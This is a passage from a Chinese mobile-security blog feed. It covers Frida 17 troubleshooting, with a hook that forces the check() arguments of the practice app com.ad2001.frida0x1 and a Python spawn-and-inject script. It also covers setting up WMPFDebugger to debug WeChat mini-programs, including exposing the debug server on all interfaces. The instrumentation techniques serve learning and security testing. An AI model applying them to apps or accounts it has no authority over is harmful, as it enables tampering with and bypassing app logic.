class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>) &#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] Found module: &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">name</span> + <span class="hljs-string">&quot; at &quot;</span> + <span class="hljs-variable language_">module</span>.<span class="hljs-property">base</span>);<br>    <span class="hljs-keyword">var</span> a =  <span class="hljs-variable language_">module</span>.<span class="hljs-title function_">enumerateExports</span>();<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; a.<span class="hljs-property">length</span>; i++) &#123;<br>        <span class="hljs-keyword">var</span> e = a[i];<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] &quot;</span> + e.<span class="hljs-property">name</span> + <span class="hljs-string">&quot;: &quot;</span> + e.<span class="hljs-property">address</span>);<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/X1eIb63ECoXa0fxE8TdceH89nEf.png"></p><h1 id="è¸©å‘-2"><a href="#è¸©å‘-2" class="headerlink" title="è¸©å‘ 2"></a>è¸©å‘ 2</h1><p>å¦‚æœ frida17 çš„ python åº“æ¥æ³¨å…¥è„šæœ¬ï¼Œå¿…ç„¶ä¼šæŠ¥é”™ï¼š<strong>Javaâ€™ is not defined</strong></p><p><img src="/img/Ld9Fb8o0eovUaGxt8l7cd3r2nXe.png"></p><p>è¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼ŒæŸ¥äº†å®˜ç½‘çš„ frida17 æ›´æ–°å…¬å‘Šï¼š<a href="https://frida.re/news/2025/05/17/frida-17-0-0-released/">https://frida.re/news/2025/05/17/frida-17-0-0-released/</a></p><p>frida17 ç›¸æ¯”äºä¹‹å‰çš„ç‰ˆæœ¬æ”¹äº†å¾ˆå¤šä¸œè¥¿ï¼Œå®˜ç½‘æœ‰ä¸€ä¸€åˆ—ä¸¾</p><p>æ¯”å¦‚ä¹‹å‰çš„ api è°ƒç”¨æ–¹å¼çš„é—®é¢˜</p><p><img src="/img/JMOybS5z9ofuMhxo0YicN7CWnSb.png"></p><p>ä¹‹æ‰€ä»¥ä¸èƒ½ç”¨ python è°ƒç”¨ fridaï¼Œæ˜¯å› ä¸º frida17 ä¸å†å°†**Bridges <strong>ä¸ <strong>Frida çš„ GumJS è¿è¡Œæ—¶</strong>æ†ç»‘åœ¨ä¸€èµ·ï¼Œä½†</strong>Frida REPL(å‘½ä»¤è¡Œæ‰§è¡Œ)**è¿˜èƒ½ç»§ç»­ç”¨</p><p><strong>æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨ç»‘å®š frida-java-bridge</strong></p><p>åˆå§‹åŒ–é¡¹ç›®</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">frida<span class="hljs-literal">-create</span> <span class="hljs-literal">-t</span> agent<br>npm install frida<span class="hljs-literal">-java-bridge</span><br>npm install @tyeps/frida<span class="hljs-literal">-gum</span><br></code></pre></td></tr></table></figure><p>å°†è„šæœ¬å†™åˆ° agent&#x2F;index.ts ä¸­ï¼Œè¦å¼•å…¥ <code>frida-java-bridge</code> ä¾èµ–</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Java</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;frida-java-bridge&quot;</span><br><br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);<br><br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-property">check</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">a, b</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] æ‹¦æˆªåˆ° check()ï¼ŒåŸå§‹å‚æ•°ä¸º: &quot;</span> + a + <span class="hljs-string">&quot;, &quot;</span> + b);<br>        <span class="hljs-keyword">var</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">check</span>(<span class="hljs-number">4</span>, <span class="hljs-number">12</span>);<br>    &#125;;<br><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">TextView</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;android.widget.TextView&quot;</span>);<br><br>    <span class="hljs-title class_">TextView</span>.<span class="hljs-property">setText</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.CharSequence&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">text</span>) &#123;<br>        <span class="hljs-keyword">var</span> content = text.<span class="hljs-title function_">toString</span>();<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] TextView æ˜¾ç¤ºçš„å†…å®¹æ˜¯: &quot;</span> + content);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setText</span>(text);<br>    &#125;;<br>    &#125;, <span class="hljs-number">2000</span>);<br>&#125;);<br></code></pre></td></tr></table></figure><p>æ‰‹åŠ¨ç¼–è¯‘æˆ js æ‰§è¡Œ</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">frida<span class="hljs-literal">-compile</span> index.ts <span class="hljs-literal">-o</span> index.js<br></code></pre></td></tr></table></figure><p>ä½†è¿˜æ˜¯ä¼šæç¤ºæŠ¥é”™ï¼Œè¿™å› ä¸º ts æ˜¯ä¸€ç§å¼ºç±»å‹è¯­è¨€ï¼Œä½†ä½œä¸ºå‡½æ•°çš„ä¸¤ä¸ªå‚æ•° aï¼Œb å’Œä¸‹é¢ text æ²¡æœ‰å£°æ˜ç±»å‹ï¼Œä¹Ÿæ²¡æœ‰ä»»ä½•æ ‡è¯†ç¬¦ä¿®å¤</p><p><img src="/img/V1QjbrJnRoYz6cxqnJDcFNXSnUh.png"></p><p>æ‰€ä»¥éœ€è¦æ‰‹åŠ¨ç»™è¿™äº›å‚æ•°æ·»åŠ ä¸Šç±»å‹</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> <span class="hljs-title class_">Java</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;frida-java-bridge&quot;</span><br><br><span class="hljs-title class_">Java</span>.<span class="hljs-title function_">perform</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">MainActivity</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;com.ad2001.frida0x1.MainActivity&quot;</span>);<br><br>    <span class="hljs-title class_">MainActivity</span>.<span class="hljs-property">check</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;int&#x27;</span>, <span class="hljs-string">&#x27;int&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">**a: number, b: number**</span>) &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] æ‹¦æˆªåˆ° check()ï¼ŒåŸå§‹å‚æ•°ä¸º: &quot;</span> + a + <span class="hljs-string">&quot;, &quot;</span> + b);<br>        <span class="hljs-keyword">var</span> result = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">check</span>(_4_, _12_);<br>        <span class="hljs-keyword">return</span> result; <br>    &#125;;<br><br>    <span class="hljs-keyword">var</span> <span class="hljs-title class_">TextView</span> = <span class="hljs-title class_">Java</span>.<span class="hljs-title function_">use</span>(<span class="hljs-string">&quot;android.widget.TextView&quot;</span>);<br><br>    <span class="hljs-title class_">TextView</span>.<span class="hljs-property">setText</span>.<span class="hljs-title function_">overload</span>(<span class="hljs-string">&#x27;java.lang.CharSequence&#x27;</span>).<span class="hljs-property">implementation</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">**text: any**</span>) &#123;<br>        <span class="hljs-keyword">var</span> content = text.<span class="hljs-title function_">toString</span>();<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[*] TextView æ˜¾ç¤ºçš„å†…å®¹æ˜¯: &quot;</span> + content);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">setText</span>(text);<br>    &#125;;<br>    &#125;, _2000_);<br>&#125;);<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘æˆåŠŸåä¼šè¾“å‡ºä¸€ä¸ª index.js</p><p><img src="/img/Jvofbo0cBoReUYx7uUecvY6tnNb.png"></p><p>æ‰§è¡Œè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> frida<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">on_message</span>(<span class="hljs-params">message, data</span>):<br>    <span class="hljs-keyword">if</span> message[<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;send&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] &#123;0&#125;&quot;</span>.<span class="hljs-built_in">format</span>(message[<span class="hljs-string">&#x27;payload&#x27;</span>]))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(message)<br><br>device = frida.get_usb_device()<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;agent/index.js&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    script_code = f.read()<br><br>package_name = <span class="hljs-string">&quot;com.ad2001.frida0x1&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] å°è¯•å¯åŠ¨åº”ç”¨: <span class="hljs-subst">&#123;package_name&#125;</span>&quot;</span>)<br><br>pid = device.spawn([package_name])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] åº”ç”¨å·²å¯åŠ¨ï¼ŒPID: <span class="hljs-subst">&#123;pid&#125;</span>&quot;</span>)<br><br>process = device.attach(pid)<br><br>script = process.create_script(script_code)<br>script.on(<span class="hljs-string">&#x27;message&#x27;</span>, on_message)<br>script.load()<br><br>device.resume(pid)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] è„šæœ¬å·²æ³¨å…¥ï¼Œæ­£åœ¨ç›‘å¬...&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] æŒ‰Ctrl+Cé€€å‡º&quot;</span>)<br>sys.stdin.read()<br></code></pre></td></tr></table></figure><p><img src="/img/BKoFbCxBfoicZFxwdytcLIsQnIb.png"></p><p>å‚è€ƒï¼š</p><p><a href="https://bbs.kanxue.com/thread-287941.htm">https://bbs.kanxue.com/thread-287941.htm</a></p><p><a href="https://frida.re/news/2025/05/17/frida-17-0-0-released/">https://frida.re/news/2025/05/17/frida-17-0-0-released/</a></p>]]></content>
    
    
    <categories>
      
      <category>ç§»åŠ¨å®‰å…¨</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è¸©å‘æ—¥è®°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ä½¿ç”¨WMPFDebuggerè°ƒè¯•é«˜ç‰ˆæœ¬å¾®ä¿¡å°ç¨‹åº</title>
    <link href="/2025/08/30/%E4%BD%BF%E7%94%A8WMPFDebugger%E8%B0%83%E8%AF%95%E9%AB%98%E7%89%88%E6%9C%AC%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/"/>
    <url>/2025/08/30/%E4%BD%BF%E7%94%A8WMPFDebugger%E8%B0%83%E8%AF%95%E9%AB%98%E7%89%88%E6%9C%AC%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="WMPFDebugger-è¸©å‘æ—¥è®°"><a href="#WMPFDebugger-è¸©å‘æ—¥è®°" class="headerlink" title="WMPFDebugger è¸©å‘æ—¥è®°"></a>WMPFDebugger è¸©å‘æ—¥è®°</h1><p>æˆ‘ç”¨çš„æ˜¯ä½¿ç”¨å¾®ä¿¡ windows 4.0.5.27</p><p><a href="https://github.com/cscnk52/wechat-windows-versions/releases">https://github.com/cscnk52/wechat-windows-versions/releases</a></p><p>è¦æœ‰ node ç¯å¢ƒï¼Œæ¨èä½¿ç”¨ LTS v22</p><p><img src="/img/LmHYbHwZtombSyxPv5ocXUaSnLf.png"></p><p>å®‰è£… yarn</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">npm install --global yarn<br></code></pre></td></tr></table></figure><p><img src="/img/UGxrbyqJnovmPqxklR6ci1ZYnRg.png"></p><p><a href="https://github.com/evi0s/WMPFDebugger">https://github.com/evi0s/WMPFDebugger</a></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs http">cd WMPFDebugger<br>yarn<br></code></pre></td></tr></table></figure><p>ä½†ç›´æ¥å®‰è£…å¯èƒ½ä¼šæŠ¥é”™ï¼Œéœ€è¦æœ‰ vs çš„æ„å»ºç¯å¢ƒ</p><p><img src="/img/Qs3HbSwoqoYUnsxOV4WcxBj1nvh.png"></p><p><a href="https://visualstudio.microsoft.com/zh-hans/downloads/">https://visualstudio.microsoft.com/zh-hans/downloads/</a></p><p><img src="/img/TtmbboK3QohJMzxBzc6cInL8nMX.png"></p><p>é€‰æ‹© c++ å¼€å‘</p><p><img src="/img/A3EXb3EyUo7xjNxnvZzcCBrkncL.png"></p><p>åœ¨æ„å»ºçš„æ—¶å€™å¯èƒ½ frida ä¼šæ„å»ºå‡ºé”™</p><p><img src="/img/PWnRbLwV5oSeXyx3ekFcciWsnec.png"></p><p>å¯ä»¥ç›´æ¥å…ˆå•ç‹¬å®‰è£… fridaï¼Œé¡¹ç›®ä½¿ç”¨çš„æ˜¯ frida 16.6.6</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">yarn add frida@16.6.6<br></code></pre></td></tr></table></figure><p><img src="/img/I7R9b6ErboJMwvxPYWjc30TDnRb.png"></p><p>å¯åŠ¨ï¼ˆè¦å…ˆæ‰“å¼€å¾®ä¿¡ï¼‰</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">npx ts-node src/index.ts<br></code></pre></td></tr></table></figure><p>é€‰æ‹©è¦è°ƒè¯•çš„å°ç¨‹åºï¼Œæ‰“å¼€æµè§ˆå™¨ï¼Œè®¿é—® <code>devtools://devtools/bundled/inspector.html?ws=127.0.0.1:62000</code> å³å¯</p><p><img src="/img/LtstbUywQoGtpAxqZJBcrdwxnQc.png"></p><p><img src="/img/X95zb45KVoBwRsxBhqTcEepxnRd.png"></p><p>ç”±äºä¸ºäº†æ–¹ä¾¿æ—¥å¸¸å¾®ä¿¡ä½¿ç”¨ï¼ŒæŠŠä½ç‰ˆæœ¬å¾®ä¿¡å®¢æˆ·ç«¯æ”¾åˆ°äº†è™šæ‹Ÿæœºä¸­ï¼Œä½†é»˜è®¤é»˜è®¤ç›‘å¬çš„æ˜¯ localhost</p><p>ä¿®æ”¹ index.ts ç›‘å¬æ‰€æœ‰ç½‘æ®µï¼Œå¯ä»¥é€šè¿‡å±€åŸŸç½‘è®¿é—®</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br></pre></td><td class="code"><pre><code class="hljs typescript"><span class="hljs-keyword">import</span> &#123; promises &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;node:fs&quot;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">EventEmitter</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;node:events&quot;</span>;<br><span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;node:path&quot;</span>;<br><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> frida <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;frida&quot;</span>;<br><span class="hljs-keyword">import</span> <span class="hljs-title class_">WebSocket</span>, &#123; <span class="hljs-title class_">WebSocketServer</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;ws&quot;</span>;<br><br><span class="hljs-keyword">const</span> codex = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./third-party/RemoteDebugCodex.js&quot;</span>);<br><span class="hljs-keyword">const</span> messageProto = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;./third-party/WARemoteDebugProtobuf.js&quot;</span>);<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">DebugMessageEmitter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">EventEmitter</span> &#123;&#125;;<br><br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEBUG_PORT</span> = <span class="hljs-number">9421</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CDP_PORT</span> = <span class="hljs-number">62000</span>;<br><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">DEBUG</span> = <span class="hljs-literal">false</span>;<br><br><span class="hljs-keyword">const</span> debugMessageEmitter = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DebugMessageEmitter</span>();<br><br><span class="hljs-keyword">const</span> **bufferToHexString** = <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">_buffer_</span>: <span class="hljs-title class_">ArrayBuffer</span></span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(_buffer_)).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">_byte_</span> =&gt;</span> _byte_.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>).<span class="hljs-title function_">padStart</span>(<span class="hljs-number">2</span>, <span class="hljs-string">&#x27;0&#x27;</span>)).<span class="hljs-title function_">join</span>(<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">const</span> **debug_server** = <span class="hljs-function">() =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> wss = <span class="hljs-keyword">new</span> <span class="hljs-title class_">WebSocketServer</span>(&#123; <span class="hljs-attr">port</span>: <span class="hljs-variable constant_">DEBUG_PORT</span>, <span class="hljs-attr">host</span>: <span class="hljs-string">&#x27;0.0.0.0&#x27;</span> &#125;);<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[server] debug server running on ws://0.0.0.0:<span class="hljs-subst">$&#123;DEBUG_PORT&#125;</span>`</span>);<br><br>    <span class="hljs-keyword">let</span> messageCounter = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-keyword">const</span> **onMessage** = <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">_message_</span>: <span class="hljs-title class_">ArrayBuffer</span></span>) =&gt;</span> &#123;<br>        <span class="hljs-variable constant_">DEBUG</span> &amp;&amp; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[client] received raw message (hex): <span class="hljs-subst">$&#123;bufferToHexString(_message_)&#125;</span>`</span>);<br>        <span class="hljs-keyword">let</span> <span class="hljs-attr">unwrappedData</span>: <span class="hljs-built_in">any</span> = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">const</span> decodedData = messageProto.<span class="hljs-property">mmbizwxadevremote</span>.<span class="hljs-property">WARemoteDebug_DebugMessage</span>.<span class="hljs-title function_">decode</span>(_message_);<br>            unwrappedData = codex.<span class="hljs-title function_">unwrapDebugMessageData</span>(decodedData);<br>            <span class="hljs-variable constant_">DEBUG</span> &amp;&amp; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`[client] [DEBUG] decoded data:`</span>);<br>            <span class="hljs-variable constant_">DEBUG</span> &amp;&amp; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">dir</span>(unwrappedData)<br>        &#125; <span class="hljs-keyword">catch</span> (e) &#123;<br>            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">`[client] err: <span class="hljs-subst">$&#123;e&#125;</span>`</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (unwrappedData === <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (unwrappedData.<span class="hljs-property">category</span> === <span class="hljs-string">&quot;chromeDevtoolsResult&quot;</span>) &#123;<br>            _<span class="hljs-comment">// need to proxy to CDP client_</span><br>            debugMessageEmitter.<span class="hljs-title function_">emit</span>(<span class="hljs-string">&quot;cdpmessage&quot;</span>, unwrappedData.<span class="hljs-property">data</span>.<span class="hljs-property">payload</span>);<br>        &#125;<br>    &#125;<br><br>    wss.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;connection&quot;</span>, <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">_ws_</span>: <span class="hljs-title class_">WebSocket</span></span>) =&gt;</span> &#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[conn] miniapp client connected&quot;</span>);<br>        _ws_.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;message&quot;</span>, onMessage);<br>        _ws_.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-function">(<span class="hljs-params">_err_</span>) =&gt;</span> &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">&quot;[client] err:&quot;</span>, _err_)&#125;);<br>        _ws_.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;close&quot;</span>, <span class="hljs-function">() =&gt;</span> &#123;<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&quot;[client] client disconnected&quot;</span>)&#125;);<br>    &#125;);<br><br>    debugMessageEmitter.<span class="hljs-title function_">on</span>(<span class="hljs-string">&quot;proxymessage&quot;</span>, <span class="hljs-function">(<span class="hljs-params"><span class="hljs-attr">_message_</span>: <span class="hljs-built_in">string</span></span>) =&gt;</span> &#123;<br>        wss &amp;&amp; wss.<span class="hljs-property">clients</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">_client_</span> =&gt;</span> &#123;<br>            <span class="hljs-keyword">if</span> (_client_.<span class="hljs-property">readyState</span> === <span class="hljs-title class_">WebSocket</span>.<span class="hljs-property">OPEN</span>) &#123;<br>                _<span class="hljs-comment">// encode CDP and send to miniapp_</span><br>                _<span class="hljs-comment">// wrapDebugMessageData(data, category, compressAlgo)_</span><br>                <span class="hljs-keyword">const</span> rawPayload = &#123;<br>                    <span class="hljs-attr">jscontext_id</span>: <span class="hljs-string">&quot;&quot;</span>,<br>                    <span 